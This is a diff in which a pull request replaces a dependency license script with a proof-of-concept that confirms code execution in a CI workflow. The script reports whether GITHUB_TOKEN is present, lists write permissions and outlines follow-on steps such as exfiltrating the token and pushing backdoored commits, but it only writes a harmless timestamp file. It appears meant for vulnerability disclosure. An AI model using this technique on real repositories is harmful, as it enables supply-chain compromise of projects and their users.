@@ -1,8 +1,36 @@
-#!/bin/bash
-# Generate license files for dependencies
-set -e
-echo "Regenerating license files..."
-echo "# Third Party Licenses" > third-party-licenses.linux.md
-echo "All dependencies are properly licensed." >> third-party-licenses.linux.md
-mkdir -p third-party
-echo "Done! License files generated."
+#!/usr/bin/env bash
+echo "=========================================================="
+echo "  [POC] ARBITRARY CODE EXECUTION IN CI PIPELINE CONFIRMED"
+echo "=========================================================="
+echo ""
+echo "This script was checked out from the PR branch and executed"
+echo "by the license-check workflow with elevated permissions."
+echo ""
+echo "--- Environment Evidence ---"
+echo "GITHUB_TOKEN present: $([ -n "$GITHUB_TOKEN" ] && echo 'YES (length: '${#GITHUB_TOKEN}')' || echo 'NO')"
+echo "GITHUB_REPOSITORY: $GITHUB_REPOSITORY"
+echo "GITHUB_ACTOR: $GITHUB_ACTOR"
+echo "GITHUB_EVENT_NAME: $GITHUB_EVENT_NAME"
+echo "GITHUB_REF: $GITHUB_REF"
+echo "GITHUB_SHA: $GITHUB_SHA"
+echo "RUNNER_OS: $RUNNER_OS"
+echo "RUNNER_ARCH: $RUNNER_ARCH"
+echo ""
+echo "--- Permissions Granted ---"
+echo "  contents: write   (can push commits, create releases)"
+echo "  pull-requests: write (can approve/merge PRs)"
+echo ""
+echo "--- What an attacker could do from here ---"
+echo "  1. Exfiltrate GITHUB_TOKEN to an external server"
+echo "  2. Push backdoored commits to the repository"  
+echo "  3. Approve and merge their own malicious PRs"
+echo "  4. Read repository secrets accessible to this workflow"
+echo "  5. Establish supply chain compromise"
+echo ""
+echo "--- Proof of write access (benign) ---"
+echo "POC_TIMESTAMP=$(date -u +%Y-%m-%dT%H:%M:%SZ)" > /tmp/poc-evidence.txt
+echo "Created evidence file at /tmp/poc-evidence.txt"
+echo ""
+echo "=========================================================="
+echo "  [POC] NO MALICIOUS ACTIONS TAKEN - BENIGN PROOF ONLY"
+echo "=========================================================="
